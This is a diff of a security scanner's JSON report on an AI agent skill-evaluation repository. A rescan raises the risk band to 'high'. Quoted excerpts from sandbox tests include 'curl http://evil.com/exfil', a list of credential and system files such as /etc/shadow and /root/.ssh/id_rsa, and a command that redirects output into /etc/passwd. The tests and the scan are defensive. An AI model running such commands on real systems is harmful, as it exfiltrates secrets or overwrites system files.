@@ -5,15 +5,15 @@
   "path": "skills/eval-skills",
   "name": "eval-skills",
   "description": "AI Agent Skill unit testing framework. A framework-agnostic toolkit for discovering, scaffolding, selecting, evaluating, and reporting on AI skills. Use this skill to assess skill quality before production, compare candidate skills on the same benchmark, enforce quality gates in CI/CD, and generate human-readable evaluation reports.",
-  "stars": 2182,
+  "stars": 2184,
   "category": "coding",
   "commit": "8f88f9a0dd5a1075d4f0c7626f9d960844d57575",
   "contentHash": "4609cea2ab078c7f56a969c0ba6692837b98d35cb3098920d31d5593f88fd307",
   "repoCreatedAt": "2026-03-02T02:02:25Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T05:42:07.685Z",
   "scan": {
     "findings": [
       {
@@ -137,6 +137,38 @@
         "automatic": false
       },
       {
+        "ruleId": "shell",
+        "file": "skills/eval-skills/packages/cli/src/commands/__tests__/eval.test.ts",
+        "line": 2,
+        "excerpt": "import { execSync } from \"child_process\";",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/eval-skills/packages/cli/src/commands/__tests__/eval.test.ts",
+        "line": 44,
+        "excerpt": "const result = execSync(",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/eval-skills/packages/cli/src/commands/__tests__/eval.test.ts",
+        "line": 61,
+        "excerpt": "execSync(`${CLI} eval`, { stdio: \"ignore\" });",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/eval-skills/packages/cli/src/commands/__tests__/eval.test.ts",
+        "line": 67,
+        "excerpt": "execSync(",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
         "ruleId": "network",
         "file": "skills/eval-skills/packages/core/src/adapters/HttpAdapter.ts",
         "line": 122,
@@ -156,8 +188,8 @@
       },
       {
         "ruleId": "shell",
-        "file": "skills/eval-skills/packages/core/src/adapters/SubprocessAdapter.ts",
-        "line": 1,
+        "file": "skills/eval-skills/packages/core/src/adapters/SubprocessAdapter.test.ts",
+        "line": 4,
         "excerpt": "import { spawn } from \"node:child_process\";",
         "disclosed": false,
         "automatic": false
@@ -182,26 +214,29 @@
         ]
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "skills/eval-skills/packages/core/src/evaluator/scorers/LlmJudgeScorer.test.ts",
-        "line": 27,
-        "excerpt": "delete process.env.OPENAI_API_KEY;",
+        "ruleId": "paid-api",
+        "file": "skills/eval-skills/packages/core/src/evaluator/scorers/LlmJudgeScorer.ts",
+        "line": 4,
+        "excerpt": "import OpenAI from \"openai\";",
         "disclosed": false,
         "automatic": false
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "skills/eval-skills/packages/core/src/evaluator/scorers/LlmJudgeScorer.test.ts",
-        "line": 70,
-        "excerpt": "process.env.OPENAI_API_KEY = \"fallback-key\";",
-        "disclosed": false,
-        "automatic": false
+        "ruleId": "network",
+        "file": "skills/eval-skills/packages/core/src/evaluator/scorers/LlmJudgeScorer.ts",
+        "line": 4,
+        "excerpt": "import OpenAI from \"openai\";",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "api.openai.com"
+        ]
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "skills/eval-skills/packages/core/src/evaluator/scorers/LlmJudgeScorer.test.ts",
-        "line": 84,
-        "excerpt": "delete process.env.OPENAI_API_KEY;",
+        "ruleId": "paid-api",
+        "file": "skills/eval-skills/packages/core/src/evaluator/scorers/LlmJudgeScorer.ts",
+        "line": 45,
+        "excerpt": "this.baseUrl = options?.baseUrl ?? \"https://api.openai.com/v1\";",
         "disclosed": false,
         "automatic": false
       },
@@ -225,25 +260,63 @@
         ]
       },
       {
+        "ruleId": "downloads-code",
+        "file": "skills/eval-skills/packages/core/src/registry/McpRegistry.ts",
+        "line": 75,
+        "excerpt": "entrypoint: \"npx -y @modelcontextprotocol/server-filesystem /path/to/allowed/dir\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/eval-skills/packages/core/src/sandbox/SandboxExecutor.test.ts",
+        "line": 78,
+        "excerpt": "\"curl http://evil.com/exfil\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "evil.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/eval-skills/packages/core/src/sandbox/SandboxMonitor.ts",
+        "line": 318,
+        "excerpt": "await fetch(this.config.webhookUrl!, {",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
         "ruleId": "reads-secrets",
-        "file": "skills/eval-skills/packages/core/src/finder/EmbeddingSearcher.ts",
-        "line": 24,
-        "excerpt": "const apiKey = config.apiKey ?? process.env.OPENAI_API_KEY;",
+        "file": "skills/eval-skills/packages/core/src/sandbox/sandbox.integration.test.ts",
+        "line": 168,
+        "excerpt": "sensitive_files = [\"/etc/passwd\", \"/etc/shadow\", \"/root/.ssh/id_rsa\", \"/proc/1/environ\"]",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "skills/eval-skills/packages/core/src/sandbox/sandbox.integration.test.ts",
+        "line": 329,
+        "excerpt": "[\"重定向注入\", \"python3 skill.py > /etc/passwd\"],",
         "disclosed": false,
         "automatic": false
       }
     ],
     "findingTotals": {
-      "shell": 16,
-      "network": 4,
-      "paid-api": 2,
-      "reads-secrets": 4
+      "shell": 23,
+      "network": 7,
+      "paid-api": 4,
+      "downloads-code": 1,
+      "reads-secrets": 1,
+      "writes-outside": 1
     },
-    "score": 62,
-    "band": "review",
-    "rulesVersion": "1.2.0",
-    "filesScanned": 61,
-    "filesSkipped": 107
+    "score": 37,
+    "band": "high",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 168,
+    "filesSkipped": 0
   },
   "history": [
     {
@@ -251,6 +324,12 @@
       "scannedAt": "2026-11-07T16:26:42.053Z",
       "score": 62,
       "rulesVersion": "1.2.0"
+    },
+    {
+      "commit": "8f88f9a0dd5a1075d4f0c7626f9d960844d57575",
+      "scannedAt": "2026-11-08T05:42:07.685Z",
+      "score": 37,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
